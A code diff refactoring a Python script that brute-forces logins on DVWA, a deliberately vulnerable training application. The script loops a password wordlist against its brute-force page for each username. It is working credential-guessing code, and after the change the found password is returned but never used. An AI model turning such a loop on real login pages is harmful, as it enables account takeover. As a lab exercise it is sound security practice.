@@ -11,6 +11,17 @@ GREEN = '\033[92m'
 RED = '\033[91m'
 RESET = '\033[0m'
 
+def session_gen(proxies, base_url):
+    session = requests.session()
+    user_token = get_response(session, base_url + 'login.php', proxies)
+    if user_token:
+        login(session, base_url + 'login.php', user_token, proxies)
+
+    user_token = get_response(session, base_url + 'security.php', proxies)
+    if user_token:
+        set_security(session, base_url + 'security.php', user_token, proxies)
+    return session
+
 def get_response(session, url, proxies=None):
     try:
         response = session.get(url, proxies=proxies)
@@ -88,6 +99,19 @@ def brute(username, password, user_token, session, url, proxies=None):
         logging.error(f"Error in brute request: {str(e)}")
         return None
 
+def bruteit(username, session, base_url, proxies, password_wordlist_file):
+    found_credentials = False  # Flag to track if valid credentials were found
+    user_token = get_response(session, base_url + 'vulnerabilities/brute/', proxies)
+    if user_token:
+        with open(password_wordlist_file, 'r') as passwords:
+            for password in passwords:
+                user_token = brute(username, password.strip(), user_token, session, base_url + 'vulnerabilities/brute/', proxies)
+                if user_token is None:
+                    found_credentials = True
+                    return password
+        if not found_credentials:
+            logging.info(f"Username: {RED}{username}{RESET} No valid credentials could be found")
+
 def main():
     parser = argparse.ArgumentParser(description='DVWA Bruteforce Script')
     group = parser.add_mutually_exclusive_group(required=True)
@@ -101,8 +125,7 @@ def main():
 
     password_wordlist_file = args.passwords
     base_url = args.base_url
-    session = requests.session()
-
+    
     # Configure logging level and format
     logging_level = logging.DEBUG if args.verbose else logging.INFO
     logging.basicConfig(level=logging_level, format='[%(levelname)s] %(message)s')
@@ -128,27 +151,10 @@ def main():
         else:
             proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
-    user_token = get_response(session, base_url + 'login.php', proxies)
-    if user_token:
-        login(session, base_url + 'login.php', user_token, proxies)
-
-    user_token = get_response(session, base_url + 'security.php', proxies)
-    if user_token:
-        set_security(session, base_url + 'security.php', user_token, proxies)
-
-    found_credentials = False  # Flag to track if valid credentials were found
+    session = session_gen(proxies, base_url)    
     for username in usernames:
-        user_token = get_response(session, base_url + 'vulnerabilities/brute/', proxies)
-        if user_token:
-            with open(password_wordlist_file, 'r') as passwords:
-                for password in passwords:
-                    user_token = brute(username, password.strip(), user_token, session, base_url + 'vulnerabilities/brute/', proxies)
-                    if user_token is None:
-                        found_credentials = True
-                        break
-
-            if not found_credentials:
-                logging.info(f"Username: {RED}{username}{RESET} No valid credentials could be found")
+        credentials = bruteit(username, session, base_url, proxies, password_wordlist_file)
+    
 
 if __name__ == '__main__':
     main()
